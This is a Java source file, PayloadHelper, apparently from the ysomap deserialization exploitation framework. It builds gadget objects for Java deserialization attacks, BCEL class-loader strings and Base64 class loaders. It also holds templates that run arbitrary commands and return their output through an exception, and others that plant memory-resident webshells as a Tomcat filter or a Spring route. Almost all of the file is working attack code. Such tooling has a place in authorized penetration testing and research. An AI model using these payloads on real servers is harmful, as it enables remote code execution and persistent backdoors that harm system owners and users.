package ysomap.core.util;

import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.apache.shiro.subject.SimplePrincipalCollection;
import ysomap.common.exception.GenerateErrorException;
import ysomap.core.ObjectGadget;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.*;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/**
 * @author wh1t3P1g
 * @since 2020/2/11
 */
@SuppressWarnings({"rawtypes","unchecked"})
public class PayloadHelper {
    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";


    public static <T> T createMemoitizedProxy (final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler (final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) ReflectionHelper.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(PayloadHelper.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }

    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        ReflectionHelper.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ReflectionHelper.setFieldValue(s, "table", tbl);
        return s;
    }

    public static TreeSet makeTreeSet(Object v1, Object v2) throws Exception {
        TreeMap<Object,Object> m = new TreeMap<>();
        ReflectionHelper.setFieldValue(m, "size", 2);
        ReflectionHelper.setFieldValue(m, "modCount", 2);
        Class<?> nodeC = Class.forName("java.util.TreeMap$Entry");
        Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
        ReflectionHelper.setAccessible(nodeCons);
        Object node = nodeCons.newInstance(v1, new Object[0], null);
        Object right = nodeCons.newInstance(v2, new Object[0], node);
        ReflectionHelper.setFieldValue(node, "right", right);
        ReflectionHelper.setFieldValue(m, "root", node);

        TreeSet set = new TreeSet();
        ReflectionHelper.setFieldValue(set, "m", m);
        return set;
    }

    public static String defaultTestCommand(){
        return "open -a Calculator";
    }

    public static ObjectGadget makeGadget(Class<? extends ObjectGadget> clazz, String type) throws GenerateErrorException {
        try {
            return clazz.newInstance();
        } catch (Exception e) {
            throw new GenerateErrorException(type, clazz.getSimpleName());
        }
    }

    public static String makeBCELStr(byte[] classbytes) throws IOException {
        return "$$BCEL$$" + Utility.encode(classbytes, true);
    }

    public static Object makeBCELClassLoader() throws Exception {
        Class<?> clazz = Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
        Object classLoader = clazz.newInstance();
        ReflectionHelper.setFieldValue(classLoader, "ignored_packages", new String[]{});
        Object defaultDomain = ReflectionHelper.getFieldValue(classLoader, "defaultDomain");
        ReflectionHelper.setFieldValue(defaultDomain, "codesource", null);
        ReflectionHelper.setFieldValue(defaultDomain, "classloader", null);
        ReflectionHelper.setFieldValue(classLoader, "defaultDomain", defaultDomain);
        ReflectionHelper.setFieldValue(classLoader, "assertionLock", null);
        ReflectionHelper.setFieldValue(classLoader, "parent", null);
        ReflectionHelper.setFieldValue(classLoader, "deferTo", null);

        Hashtable classes = (Hashtable) ReflectionHelper.getFieldValue(classLoader, "classes");
        classes.put("java.lang.Object", Object.class);
        classes.put("java.lang.Runtime", Runtime.class);
        return classLoader;
    }

    public static Object makeSimplePrincipalCollection(){
        return new SimplePrincipalCollection();
    }

    public static String makeExceptionPayload(String cmd){
        return "StringBuilder localStringBuffer = new StringBuilder();\n" +
                "Process localProcess = Runtime.getRuntime().exec(\""+
                cmd.replaceAll("\\\\","\\\\\\\\")
                        .replaceAll("\"", "\\\"") +"\");\n" +
                "java.io.BufferedReader localBufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(localProcess.getInputStream()));\n" +
                "String str1;\n" +
                "try {\n" +
                "     while ((str1 = localBufferedReader.readLine()) != null) {\n" +
                "         localStringBuffer.append(str1).append(\"\\n\");\n" +
                "     }\n" +
                "}catch (Exception e){\n" +
                "}\n" +
                "throw new Exception(localStringBuffer.toString());";
    }


    public static String makeBytesLoader(String code, String classname) {
        return "try{\n" +
                "   String s1=\"" + code + "\";\n" +
                "   byte[] bytes1= java.util.Base64.getDecoder().decode(s1.getBytes());\n" +
                "   java.lang.reflect.Method m = ClassLoader.class.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});\n" +
                "   m.setAccessible(true);\n" +
                "   m.invoke(java.lang.ClassLoader.getSystemClassLoader(), new Object[]{\"" + classname + "\",bytes1, 0, bytes1.length});\n" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}";
    }

    //https://xz.aliyun.com/t/7388#toc-3
    public static String makeTomcatFilterRegister(String classname) {
        return "try{\n" +
                "            java.lang.reflect.Field field = org.apache.catalina.core.ApplicationFilterChain.class\n" +
                "                    .getDeclaredField(\"lastServicedRequest\");\n" +
                "            field.setAccessible(true);\n" +
                "            ThreadLocal t = (ThreadLocal) field.get(null);\n" +
                "            javax.servlet.ServletRequest servletRequest = null;\n" +
                "            if (t != null && t.get() != null) {\n" +
                "                servletRequest = (javax.servlet.ServletRequest) t.get();\n" +
                "            }\n" +
                "            if (servletRequest != null) {\n" +
                "                javax.servlet.ServletContext servletContext = servletRequest.getServletContext();\n" +
                "                org.apache.catalina.core.StandardContext standardContext = null;\n" +
                "                if (servletContext.getFilterRegistration(\"threedr3am\") == null) {\n" +
                "                    for (; standardContext == null; ) {\n" +
                "                        java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField(\"context\");\n" +
                "                        contextField.setAccessible(true);\n" +
                "                        Object o = contextField.get(servletContext);\n" +
                "                        if (o instanceof javax.servlet.ServletContext) {\n" +
                "                            servletContext = (javax.servlet.ServletContext) o;\n" +
                "                        } else if (o instanceof org.apache.catalina.core.StandardContext) {\n" +
                "                            standardContext = (org.apache.catalina.core.StandardContext) o;\n" +
                "                        }\n" +
                "                    }\n" +
                "                    if (standardContext != null) {\n" +
                "                        java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class\n" +
                "                                .getDeclaredField(\"state\");\n" +
                "                        stateField.setAccessible(true);\n" +
                "                        stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);\n" +
                "                        javax.servlet.Filter star = (javax.servlet.Filter)(Class.forName(\"" + classname + "\").newInstance());\n" +
                "                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext\n" +
                "                                .addFilter(\"star\", star);\n" +
                "                        filterRegistration.setInitParameter(\"encoding\", \"utf-8\");\n" +
                "                        filterRegistration.setAsyncSupported(false);\n" +
                "                        filterRegistration\n" +
                "                                .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,\n" +
                "                                        new String[]{\"/*\"});\n" +
                "                        if (stateField != null) {\n" +
                "                            stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);\n" +
                "                        }\n" +
                "                        if (standardContext != null) {\n" +
                "                            java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod(\"filterStart\",null);\n" +
                "                            filterStartMethod.setAccessible(true);\n" +
                "                            filterStartMethod.invoke(standardContext, null);\n" +
                "                            org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext\n" +
                "                                    .findFilterMaps();\n" +
                "                            for (int i = 0; i < filterMaps.length; i++) {\n" +
                "                                if (filterMaps[i].getFilterName().equalsIgnoreCase(\"star\")) {\n" +
                "                                    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];\n" +
                "                                    filterMaps[i] = filterMaps[0];\n" +
                "                                    filterMaps[0] = filterMap;\n" +
                "                                    break;\n" +
                "                                }\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }catch(Exception e){\n" +
                "            e.printStackTrace();\n" +
                "        }";

    }

    //https://xz.aliyun.com/t/7388#toc-2
    public static String makeGetTomcatRequest() {
        return "Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");\n" +
                "java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\");\n" +
                "java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\");\n" +
                "modifiersField.setAccessible(true);\n" +
                "modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n" +
                "f.setAccessible(true);\n" +
                "if (!f.getBoolean(null)) {\n" +
                "   f.setBoolean(null, true);\n" +
                "}\n" +
                "c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");\n" +
                "f = c.getDeclaredField(\"lastServicedRequest\");\n" +
                "modifiersField = f.getClass().getDeclaredField(\"modifiers\");\n" +
                "modifiersField.setAccessible(true);\n" +
                "modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n" +
                "f.setAccessible(true);\n" +
                "if (f.get(null) == null) {\n" +
                "   f.set(null, new ThreadLocal());\n" +
                "}\n" +
                "f = c.getDeclaredField(\"lastServicedResponse\");\n" +
                "modifiersField = f.getClass().getDeclaredField(\"modifiers\");\n" +
                "modifiersField.setAccessible(true);\n" +
                "modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);\n" +
                "f.setAccessible(true);\n" +
                "if (f.get(null) == null) {\n" +
                "   f.set(null, new ThreadLocal());\n" +
                "}";
    }

    public static String makeRegisterSpringShell(String routepath, String classname) {
        return "try{\n" +
                "   javax.servlet.ServletContext sss = ((org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();\n" +
                "   org.springframework.web.context.WebApplicationContext context  = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContext(sss);\n" +
                "   org.springframework.web.servlet.mvc.condition.PatternsRequestCondition url = new org.springframework.web.servlet.mvc.condition.PatternsRequestCondition(new String[]{\"/" + routepath + "\"});\n" +
                "   org.springframework.web.bind.annotation.RequestMethod[] a={org.springframework.web.bind.annotation.RequestMethod.GET,org.springframework.web.bind.annotation.RequestMethod.POST};\n" +
                "   org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition ms = new org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition(a);\n" +
                "   org.springframework.web.servlet.mvc.method.RequestMappingInfo info = new org.springframework.web.servlet.mvc.method.RequestMappingInfo(url, ms, null, null, null, null, null);\n" +
                "   org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping rs = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);\n" +
                "   java.lang.reflect.Method m = (Class.forName(\"" + classname + "\").getDeclaredMethods())[0];\n" +
                "   rs.registerMapping(info, Class.forName(\"" + classname + "\").newInstance(), m);\n" +
                "} catch (Exception e) {\n" +
                "   e.printStackTrace();\n" +
                "}";
    }
}
